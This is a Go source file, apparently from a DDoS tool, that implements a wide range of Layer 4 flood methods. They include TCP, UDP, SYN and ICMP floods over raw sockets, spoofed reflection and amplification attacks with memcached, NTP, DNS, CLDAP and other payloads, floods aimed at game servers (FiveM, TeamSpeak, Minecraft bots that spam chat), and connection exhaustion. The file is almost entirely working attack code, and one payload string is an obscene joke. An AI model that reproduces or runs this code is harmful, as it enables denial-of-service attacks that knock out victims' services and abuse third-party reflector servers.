package attack

import (
	"context"
	"encoding/binary"
	"math/rand"
	"net"
	"syscall"
	"time"

	"Polygon/packet"
	"Polygon/proxy"
	"Polygon/stats"
)

// Layer4 runs a Layer 4 flood in goroutines controlled by ctx.
type Layer4 struct {
	Target     string
	Port       uint16
	Method     string
	Refs       []string   // reflector IPs for AMP methods
	Proxies    []proxy.Proxy
	ProtocolID int
	LocalIP    net.IP
}

func (l *Layer4) dial() (net.Conn, error) {
	if len(l.Proxies) > 0 {
		p := l.Proxies[rand.Intn(len(l.Proxies))]
		d, err := p.Dialer()
		if err != nil {
			return nil, err
		}
		return d("tcp", net.JoinHostPort(l.Target, itoa(int(l.Port))))
	}
	return net.DialTimeout("tcp", net.JoinHostPort(l.Target, itoa(int(l.Port))), 900*time.Millisecond)
}

func itoa(n int) string {
	return net.JoinHostPort("", "")[0:0] + func() string {
		b := make([]byte, 0, 5)
		for n > 0 {
			b = append([]byte{byte('0' + n%10)}, b...)
			n /= 10
		}
		if len(b) == 0 {
			return "0"
		}
		return string(b)
	}()
}

// Run starts the flood loop until ctx is cancelled.
func (l *Layer4) Run(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			switch l.Method {
			case "TCP":
				l.tcp()
			case "UDP":
				l.udp()
			case "SYN":
				l.syn()
			case "ICMP":
				l.icmp()
			case "VSE":
				l.vse()
			case "TS3":
				l.ts3()
			case "MCPE":
				l.mcpe()
			case "FIVEM":
				l.fivem()
			case "FIVEM-TOKEN":
				l.fivemToken()
			case "OVH-UDP":
				l.ovhudp()
			case "MINECRAFT":
				l.minecraft()
			case "MCBOT":
				l.mcbot()
			case "CPS":
				l.cps()
			case "CONNECTION":
				l.connection()
			default:
				if ampPayload, ampPort := l.ampPayload(); ampPayload != nil {
					l.amp(ampPayload, ampPort)
				} else {
					l.tcp()
				}
			}
		}
	}
}

func (l *Layer4) tcp() {
	conn, err := l.dial()
	if err != nil {
		return
	}
	defer conn.Close()
	buf := make([]byte, 1024)
	rand.Read(buf)
	for {
		n, err := conn.Write(buf)
		if err != nil {
			return
		}
		stats.AddBytes(int64(n))
		stats.AddRequest(1)
	}
}

func (l *Layer4) udp() {
	conn, err := net.Dial("udp", net.JoinHostPort(l.Target, itoa(int(l.Port))))
	if err != nil {
		return
	}
	defer conn.Close()
	buf := make([]byte, 1024)
	rand.Read(buf)
	for {
		n, err := conn.Write(buf)
		if err != nil {
			return
		}
		stats.AddBytes(int64(n))
		stats.AddRequest(1)
	}
}

func (l *Layer4) rawSocket(proto int) (int, error) {
	return syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, proto)
}

func (l *Layer4) sendRaw(fd int, pkt []byte, dstIP net.IP, dstPort uint16) error {
	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dstIP.To4())
	addr.Port = int(dstPort)
	if err := syscall.Sendto(fd, pkt, 0, &addr); err != nil {
		return err
	}
	stats.AddBytes(int64(len(pkt)))
	stats.AddRequest(1)
	return nil
}

func (l *Layer4) syn() {
	fd, err := l.rawSocket(syscall.IPPROTO_TCP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	dstIP := net.ParseIP(l.Target)
	for {
		pkt := packet.BuildSYN(l.LocalIP, dstIP, l.Port)
		if err := l.sendRaw(fd, pkt, dstIP, l.Port); err != nil {
			return
		}
	}
}

func (l *Layer4) icmp() {
	fd, err := l.rawSocket(syscall.IPPROTO_ICMP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	dstIP := net.ParseIP(l.Target)
	payloadSize := 16 + rand.Intn(1008)
	pkt := packet.BuildICMP(l.LocalIP, dstIP, payloadSize)
	for {
		if err := l.sendRaw(fd, pkt, dstIP, 0); err != nil {
			return
		}
	}
}

func (l *Layer4) amp(payload []byte, reflectorPort uint16) {
	if len(l.Refs) == 0 {
		return
	}
	fd, err := l.rawSocket(syscall.IPPROTO_UDP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	targetIP := net.ParseIP(l.Target)
	for {
		for _, ref := range l.Refs {
			refIP := net.ParseIP(ref)
			pkt := packet.BuildAMP(targetIP, l.Port, refIP, reflectorPort, payload)
			l.sendRaw(fd, pkt, refIP, reflectorPort)
		}
	}
}

func (l *Layer4) ampPayload() ([]byte, uint16) {
	switch l.Method {
	case "MEM":
		return []byte("\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n"), 11211
	case "NTP":
		return []byte("\x17\x00\x03\x2a\x00\x00\x00\x00"), 123
	case "DNS":
		return []byte("\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00"), 53
	case "RDP":
		return []byte("\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00"), 3389
	case "CLDAP":
		return []byte("\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00"), 389
	case "CHAR":
		return []byte("\x01"), 19
	case "ARD":
		return []byte("\x00\x14\x00\x00"), 3283
	}
	return nil, 0
}

func (l *Layer4) udpSend(payload []byte) {
	conn, err := net.Dial("udp", net.JoinHostPort(l.Target, itoa(int(l.Port))))
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		n, err := conn.Write(payload)
		if err != nil {
			return
		}
		stats.AddBytes(int64(n))
		stats.AddRequest(1)
	}
}

func (l *Layer4) vse() {
	l.udpSend([]byte("\xff\xff\xff\xffTSource Engine Query\x00"))
}

func (l *Layer4) ts3() {
	l.udpSend([]byte("\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"))
}

func (l *Layer4) mcpe() {
	l.udpSend([]byte("atom data onto my own ass amp/triphen\tis my dick and balls"))
}

func (l *Layer4) fivem() {
	l.udpSend([]byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"))
}

func (l *Layer4) fivemToken() {
	token := randUUID()
	guid := 76561197960265728 + rand.Int63n(2038034271)
	payload := []byte("token=" + token + "&guid=" + itoa(int(guid)))
	l.udpSend(payload)
}

func (l *Layer4) ovhudp() {
	fd, err := l.rawSocket(syscall.IPPROTO_UDP)
	if err != nil {
		return
	}
	defer syscall.Close(fd)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	dstIP := net.ParseIP(l.Target)
	methods := []string{"PGET", "POST", "HEAD", "OPTIONS", "PURGE"}
	paths := []string{"/0/0/0/0/0/0", "/", "/null", "/%00%00%00%00"}

	for {
		method := methods[rand.Intn(len(methods))]
		path := paths[rand.Intn(len(paths))]
		body := make([]byte, 1024+rand.Intn(1024))
		rand.Read(body)
		payload := []byte(method + " " + path + " HTTP/1.1\r\nHost: " +
			net.JoinHostPort(l.Target, itoa(int(l.Port))) + "\r\n\r\n")
		payload = append(payload, body...)
		pkt := packet.BuildAMP(l.LocalIP, uint16(32768+rand.Intn(32767)), dstIP, l.Port, payload)
		l.sendRaw(fd, pkt, dstIP, l.Port)
	}
}

func (l *Layer4) minecraft() {
	conn, err := l.dial()
	if err != nil {
		return
	}
	defer conn.Close()
	hs := mcHandshake(l.Target, l.Port, l.ProtocolID, 1)
	ping := mcData([]byte("\x00"))
	for {
		if _, err := conn.Write(hs); err != nil {
			return
		}
		stats.AddBytes(int64(len(hs)))
		if _, err := conn.Write(ping); err != nil {
			return
		}
		stats.AddBytes(int64(len(ping)))
		stats.AddRequest(1)
	}
}

func (l *Layer4) mcbot() {
	conn, err := l.dial()
	if err != nil {
		return
	}
	defer conn.Close()

	fwdIP := randIPv4()
	uuid := randUUID()
	hs := mcHandshakeForwarded(l.Target, l.Port, l.ProtocolID, 2, fwdIP, uuid)
	if _, err := conn.Write(hs); err != nil {
		return
	}

	username := "MHDDoS_" + randStr(5)
	login := mcLogin(l.ProtocolID, username)
	if _, err := conn.Write(login); err != nil {
		return
	}

	time.Sleep(1500 * time.Millisecond)

	reg := mcChat(l.ProtocolID, "/register pass1234 pass1234")
	conn.Write(reg)
	lgn := mcChat(l.ProtocolID, "/login pass1234")
	conn.Write(lgn)

	for {
		msg := mcChat(l.ProtocolID, randStr(256))
		if _, err := conn.Write(msg); err != nil {
			return
		}
		stats.AddRequest(1)
		time.Sleep(1100 * time.Millisecond)
	}
}

func (l *Layer4) cps() {
	conn, err := l.dial()
	if err != nil {
		return
	}
	conn.Close()
	stats.AddRequest(1)
}

func (l *Layer4) connection() {
	conn, err := l.dial()
	if err != nil {
		return
	}
	stats.AddRequest(1)
	go func() {
		buf := make([]byte, 1)
		for {
			if _, err := conn.Read(buf); err != nil {
				conn.Close()
				return
			}
		}
	}()
}

func randIPv4() string {
	return net.IPv4(
		byte(rand.Intn(256)),
		byte(rand.Intn(256)),
		byte(rand.Intn(256)),
		byte(rand.Intn(256)),
	).String()
}

// le16 encodes n as little-endian uint16 bytes.
func le16(n uint16) []byte {
	b := make([]byte, 2)
	binary.LittleEndian.PutUint16(b, n)
	return b
}
